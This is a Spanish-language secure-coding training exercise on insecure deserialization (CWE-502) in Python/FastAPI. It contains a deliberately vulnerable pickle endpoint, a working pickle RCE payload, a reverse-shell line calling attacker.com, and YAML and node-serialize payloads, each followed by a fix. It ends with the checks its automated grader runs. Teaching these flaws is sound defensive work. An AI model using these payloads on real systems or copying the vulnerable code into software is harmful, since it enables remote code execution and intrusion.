# Paso 4 — Insecure Deserialization
**Tecnologia:** Python / FastAPI | **OWASP:** A08:2021 - Software and Data Integrity Failures | **CWE-502**

---

## Que es esta vulnerabilidad?

Insecure Deserialization ocurre cuando una aplicacion deserializa datos de una fuente no confiable usando un formato que permite ejecucion de codigo o manipulacion arbitraria de objetos. No se trata de que los datos sean incorrectos en formato — se trata de que el propio proceso de deserializacion ejecuta codigo que el atacante controla.

`pickle` de Python es el ejemplo canonico: el formato no solo guarda datos, tambien guarda instrucciones de reconstruccion de objetos. Al deserializar, Python ejecuta esas instrucciones. Un atacante puede construir un payload que al deserializarse ejecute cualquier comando del sistema, sin importar que validacion se haga despues.

Esta vulnerabilidad es critica porque es dificil de detectar visualmente (los datos parecen una cadena base64 inofensiva) y el impacto es maximo: RCE con los privilegios del proceso servidor. Fue la causa raiz de breaches masivos en Jenkins, WebLogic y JBoss.

---

## Donde ocurre en este codigo?

**Archivo:** `src/python/routes/serialize.py`

```python
# CODIGO VULNERABLE — estado actual del ejercicio
import base64
import pickle

@router.post("/load-prefs")
async def load_prefs(data: str):
    prefs = pickle.loads(base64.b64decode(data))  # ejecuta codigo arbitrario
    return prefs
```

El problema es `pickle.loads()` sobre datos controlados por el usuario. No importa cuanta validacion se haga despues: la ejecucion de codigo ocurre durante la propia llamada a `pickle.loads()`, antes de cualquier comprobacion de tipos o estructura. Base64 solo es encoding, no proteccion.

---

## Como lo explotaria un atacante

**Paso 1: Generar el payload malicioso:**
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/rce.txt",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)  # cadena base64 lista para enviar
```

**Paso 2: Enviar el payload:**
```
POST /load-prefs
Content-Type: application/x-www-form-urlencoded

data=gASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcmNlLnR4dJSFlFKULg==
```

Al ejecutar `pickle.loads()`, Python corre `os.system("id > /tmp/rce.txt")` antes de devolver ningun resultado. El archivo `/tmp/rce.txt` contendra la salida del comando.

**Escalada a reverse shell:**
```python
class RCE:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        return (os.system, (cmd,))
```

---

## Tu tarea: aplicar la mitigacion

Modifica `src/python/routes/serialize.py` para usar JSON con un modelo validado:

```python
# CODIGO SEGURO
import json
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, ValidationError

router = APIRouter()

class UserPreferences(BaseModel):
    theme: str
    language: str
    notifications: bool

@router.post("/load-prefs")
async def load_prefs(data: str):
    try:
        raw = json.loads(data)
        validated = UserPreferences(**raw)
    except (json.JSONDecodeError, ValidationError) as e:
        raise HTTPException(status_code=400, detail="Datos invalidos")
    return validated.model_dump()
```

### Por que funciona esta mitigacion?

- **JSON en lugar de pickle:** JSON es un formato de datos puro. No tiene instrucciones de reconstruccion de objetos ni mecanismos de ejecucion de codigo. `json.loads()` no puede ejecutar codigo Python arbitrario bajo ninguna circunstancia.
- **Modelo Pydantic (`UserPreferences`):** define el esquema esperado. Si el JSON contiene campos extra o tipos incorrectos, `ValidationError` es lanzado antes de que los datos lleguen a la logica de negocio.
- **`model_dump()`:** serializa solo los campos definidos en el modelo, evitando que campos no esperados pasen a traves aunque lleguen en el JSON.
- **Regla general:** nunca usar `pickle`, `marshal` o `shelve` con datos externos. Incluso con firma HMAC del payload, el riesgo es alto porque la clave de firma puede ser comprometida.

---

## Variantes de la misma categoria (Software and Data Integrity — mas complejas)

### Variante A: PyYAML `yaml.load()` sin Loader seguro

```python
# VULNERABLE — yaml.load() sin Loader ejecuta constructores Python
import yaml

@router.post("/config")
async def load_config(data: str):
    config = yaml.load(data)  # ejecuta codigo YAML arbitrario
    return config
```

Payload YAML malicioso que ejecuta un comando:
```yaml
!!python/object/apply:os.system
- "id > /tmp/rce.txt"
```

```python
# SEGURO — SafeLoader deserializa solo tipos basicos
import yaml

@router.post("/config")
async def load_config(data: str):
    config = yaml.safe_load(data)  # solo dict, list, str, int, float, bool
    return config
```

`yaml.safe_load()` rechaza cualquier tag `!!python/...` lanzando `yaml.constructor.ConstructorError`.

---

### Variante B: Java ObjectInputStream con gadget chains

```java
// VULNERABLE — deserializacion directa desde input de usuario
@PostMapping("/restore")
public ResponseEntity<?> restore(@RequestBody byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // puede activar gadget chains del classpath
    return ResponseEntity.ok(obj.toString());
}
```

Con librerias como `commons-collections` en el classpath, existen "gadget chains" que producen RCE al deserializar objetos Java aparentemente normales. Esta fue la base de CVE-2015-4852 (WebLogic), CVE-2017-10271 (WebLogic) y el vector principal del ataque a Jenkins.

```java
// SEGURO — usar Jackson con tipo explicito definido
@PostMapping("/restore")
public ResponseEntity<UserPreferences> restore(@RequestBody String json) throws Exception {
    UserPreferences prefs = objectMapper.readValue(json, UserPreferences.class);
    return ResponseEntity.ok(prefs);
}
```

---

### Variante C: Node.js `node-serialize` con ejecucion de IIFE

```javascript
// VULNERABLE — node-serialize permite funciones en el JSON serializado
const serialize = require('node-serialize');

app.post('/restore', (req, res) => {
    const obj = serialize.unserialize(req.body.data);  // ejecuta funciones
    res.json(obj);
});
```

Payload donde el sufijo `()` convierte la funcion en IIFE que se ejecuta inmediatamente:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
```

```javascript
// SEGURO — JSON.parse con validacion de esquema
const Joi = require('joi');
const schema = Joi.object({ theme: Joi.string(), lang: Joi.string() });

app.post('/restore', (req, res) => {
    const raw = JSON.parse(req.body.data);  // JSON puro, sin ejecucion de funciones
    const { error, value } = schema.validate(raw);
    if (error) return res.status(400).json({ error: 'Datos invalidos' });
    res.json(value);
});
```

---

## Referencias

- [OWASP A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [PortSwigger - Insecure deserialization](https://portswigger.net/web-security/deserialization)
- [CVE-2015-4852 — Apache Commons Collections gadget chain](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 04** exige que `src/python/routes/serialize.py` contenga:
- `json.loads`
- `UserPreferences`
- La ausencia de `pickle.loads`